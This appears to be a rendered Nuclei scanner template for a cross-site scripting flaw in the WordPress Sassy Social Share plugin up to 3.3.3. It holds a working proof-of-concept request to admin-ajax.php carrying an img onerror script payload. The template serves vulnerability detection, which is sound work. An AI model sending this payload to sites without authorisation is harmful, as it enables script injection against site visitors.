# Nuclei Template: Sassy Social Share <=3.3.3 - Cross-Site Scripting
**Template ID:** sassy-social-share-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** Medium
**CWE:** CWE-80
**Source:** Nuclei Template (`sassy-social-share.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Sassy Social Share 3.3.3 and prior is vulnerable to cross-site scripting because certain AJAX endpoints return JSON data with no Content-Type header set and then use the default text/html. In other words, any JSON that has HTML will be rendered as such.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wp-admin/admin-ajax.php?action=heateor_sss_sharing_count&urls[%3Cimg%20src%3dx%20onerror%3dalert(document.domain)%3E]=
```

## References
- https://wpscan.com/vulnerability/4631519b-2060-43a0-b69b-b3d7ed94c705
